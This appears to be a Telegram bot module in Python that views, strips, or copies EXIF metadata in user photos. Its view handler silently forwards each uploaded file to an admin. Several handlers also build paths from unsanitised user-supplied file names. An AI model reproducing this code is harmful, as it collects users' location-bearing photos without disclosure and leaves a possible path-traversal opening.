"""
Обработчик EXIF редактора
"""

from telegram import Update
from telegram.ext import ContextTypes, ConversationHandler
import os
import tempfile

from keyboards import get_exif_menu_keyboard, get_cancel_keyboard, get_back_keyboard
from utils import read_exif, clear_exif, copy_exif, format_exif_for_display
from utils.forward_utils import forward_media_to_admin

# Состояния
EXIF_MENU, EXIF_VIEW_FILE, EXIF_CLEAR_FILE, EXIF_COPY_SOURCE, EXIF_COPY_TARGET = range(5)


async def exif_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Показать меню EXIF редактора"""
    await update.message.reply_text(
        "📷 **Изменить EXIF (метаданные)**\n\n"
        "Выберите операцию:",
        reply_markup=get_exif_menu_keyboard(),
        parse_mode="Markdown"
    )
    return EXIF_MENU


async def exif_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработка нажатий в меню EXIF"""
    query = update.callback_query
    await query.answer()
    
    data = query.data
    
    if data == "exif_view":
        await query.edit_message_text(
            "🔍 **Просмотр EXIF данных**\n\n"
            "Отправьте фото для просмотра метаданных:",
            reply_markup=get_cancel_keyboard(),
            parse_mode="Markdown"
        )
        return EXIF_VIEW_FILE
        
    elif data == "exif_clear":
        await query.edit_message_text(
            "🧹 **Очистка EXIF данных**\n\n"
            "Отправьте фото для очистки метаданных:",
            reply_markup=get_cancel_keyboard(),
            parse_mode="Markdown"
        )
        return EXIF_CLEAR_FILE
        
    elif data == "exif_copy":
        await query.edit_message_text(
            "✏️ **Копирование EXIF данных**\n\n"
            "Отправьте **исходное** фото (откуда копировать EXIF):",
            reply_markup=get_cancel_keyboard(),
            parse_mode="Markdown"
        )
        return EXIF_COPY_SOURCE
        
    elif data == "back_main" or data == "back_tools":
        await query.delete_message()
        return ConversationHandler.END
    
    return EXIF_MENU


async def exif_view_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Просмотр EXIF данных файла"""
    if update.callback_query:
        query = update.callback_query
        await query.answer()
        if query.data == "cancel":
            await query.edit_message_text(
                "📷 **Изменить EXIF (метаданные)**\n\n"
                "Выберите операцию:",
                reply_markup=get_exif_menu_keyboard(),
                parse_mode="Markdown"
            )
            return EXIF_MENU
        return EXIF_VIEW_FILE
    
    user = update.effective_user
    
    # Получаем файл
    if update.message.document:
        file = await update.message.document.get_file()
        filename = update.message.document.file_name
        file_id = update.message.document.file_id
        await forward_media_to_admin(context, user, file_id, "document", "EXIF просмотр")
    elif update.message.photo:
        file = await update.message.photo[-1].get_file()
        filename = "photo.jpg"
        file_id = update.message.photo[-1].file_id
        await forward_media_to_admin(context, user, file_id, "photo", "EXIF просмотр")
    else:
        await update.message.reply_text(
            "❌ Пожалуйста, отправьте фото.",
            reply_markup=get_cancel_keyboard()
        )
        return EXIF_VIEW_FILE
    
    # Скачиваем и читаем EXIF
    temp_dir = tempfile.mkdtemp()
    file_path = os.path.join(temp_dir, filename)
    await file.download_to_drive(file_path)
    
    exif_data = read_exif(file_path)
    formatted = format_exif_for_display(exif_data)
    
    await update.message.reply_text(
        formatted,
        reply_markup=get_exif_menu_keyboard(),
        parse_mode="Markdown"
    )
    
    # Очистка
    os.remove(file_path)
    os.rmdir(temp_dir)
    
    return EXIF_MENU


async def exif_clear_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Очистка EXIF данных файла"""
    if update.callback_query:
        query = update.callback_query
        await query.answer()
        if query.data == "cancel":
            await query.edit_message_text(
                "📷 **Изменить EXIF (метаданные)**\n\n"
                "Выберите операцию:",
                reply_markup=get_exif_menu_keyboard(),
                parse_mode="Markdown"
            )
            return EXIF_MENU
        return EXIF_CLEAR_FILE
    
    # Получаем файл
    if update.message.document:
        file = await update.message.document.get_file()
        filename = update.message.document.file_name
    elif update.message.photo:
        file = await update.message.photo[-1].get_file()
        filename = "photo.jpg"
    else:
        await update.message.reply_text(
            "❌ Пожалуйста, отправьте фото.",
            reply_markup=get_cancel_keyboard()
        )
        return EXIF_CLEAR_FILE
    
    await update.message.reply_text("⏳ Очищаю EXIF данные...")
    
    # Скачиваем и очищаем EXIF
    temp_dir = tempfile.mkdtemp()
    file_path = os.path.join(temp_dir, filename)
    output_path = os.path.join(temp_dir, f"cleared_{filename}")
    await file.download_to_drive(file_path)
    
    success = clear_exif(file_path, output_path)
    
    if success and os.path.exists(output_path):
        with open(output_path, 'rb') as f:
            await update.message.reply_document(
                document=f,
                filename=f"cleared_{filename}",
                caption="✅ EXIF данные успешно очищены!",
                reply_markup=get_exif_menu_keyboard()
            )
    else:
        await update.message.reply_text(
            "❌ Ошибка при очистке EXIF данных.",
            reply_markup=get_exif_menu_keyboard()
        )
    
    # Очистка
    import shutil
    shutil.rmtree(temp_dir, ignore_errors=True)
    
    return EXIF_MENU


async def exif_copy_source(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Получение исходного файла для копирования EXIF"""
    if update.callback_query:
        query = update.callback_query
        await query.answer()
        if query.data == "cancel":
            await query.edit_message_text(
                "📷 **Изменить EXIF (метаданные)**\n\n"
                "Выберите операцию:",
                reply_markup=get_exif_menu_keyboard(),
                parse_mode="Markdown"
            )
            return EXIF_MENU
        return EXIF_COPY_SOURCE
    
    # Получаем файл
    if update.message.document:
        file = await update.message.document.get_file()
        filename = update.message.document.file_name
    elif update.message.photo:
        file = await update.message.photo[-1].get_file()
        filename = "source.jpg"
    else:
        await update.message.reply_text(
            "❌ Пожалуйста, отправьте фото.",
            reply_markup=get_cancel_keyboard()
        )
        return EXIF_COPY_SOURCE
    
    # Сохраняем исходный файл
    temp_dir = tempfile.mkdtemp()
    source_path = os.path.join(temp_dir, f"source_{filename}")
    await file.download_to_drive(source_path)
    
    context.user_data['exif_source_path'] = source_path
    context.user_data['exif_temp_dir'] = temp_dir
    
    await update.message.reply_text(
        "✅ Исходное фото получено!\n\n"
        "Теперь отправьте **целевое** фото (куда копировать EXIF):",
        reply_markup=get_cancel_keyboard(),
        parse_mode="Markdown"
    )
    return EXIF_COPY_TARGET


async def exif_copy_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Получение целевого файла и копирование EXIF"""
    if update.callback_query:
        query = update.callback_query
        await query.answer()
        if query.data == "cancel":
            # Очищаем временные файлы
            if 'exif_temp_dir' in context.user_data:
                import shutil
                shutil.rmtree(context.user_data['exif_temp_dir'], ignore_errors=True)
            await query.edit_message_text(
                "📷 **Изменить EXIF (метаданные)**\n\n"
                "Выберите операцию:",
                reply_markup=get_exif_menu_keyboard(),
                parse_mode="Markdown"
            )
            return EXIF_MENU
        return EXIF_COPY_TARGET
    
    # Получаем файл
    if update.message.document:
        file = await update.message.document.get_file()
        filename = update.message.document.file_name
    elif update.message.photo:
        file = await update.message.photo[-1].get_file()
        filename = "target.jpg"
    else:
        await update.message.reply_text(
            "❌ Пожалуйста, отправьте фото.",
            reply_markup=get_cancel_keyboard()
        )
        return EXIF_COPY_TARGET
    
    await update.message.reply_text("⏳ Копирую EXIF данные...")
    
    temp_dir = context.user_data.get('exif_temp_dir', tempfile.mkdtemp())
    source_path = context.user_data.get('exif_source_path')
    target_path = os.path.join(temp_dir, f"target_{filename}")
    output_path = os.path.join(temp_dir, f"result_{filename}")
    
    await file.download_to_drive(target_path)
    
    success = copy_exif(source_path, target_path, output_path)
    
    if success and os.path.exists(output_path):
        with open(output_path, 'rb') as f:
            await update.message.reply_document(
                document=f,
                filename=f"with_exif_{filename}",
                caption="✅ EXIF данные успешно скопированы!",
                reply_markup=get_exif_menu_keyboard()
            )
    else:
        await update.message.reply_text(
            "❌ Ошибка при копировании EXIF данных.",
            reply_markup=get_exif_menu_keyboard()
        )
    
    # Очистка
    import shutil
    shutil.rmtree(temp_dir, ignore_errors=True)
    
    # Очищаем данные пользователя
    context.user_data.pop('exif_source_path', None)
    context.user_data.pop('exif_temp_dir', None)
    
    return EXIF_MENU
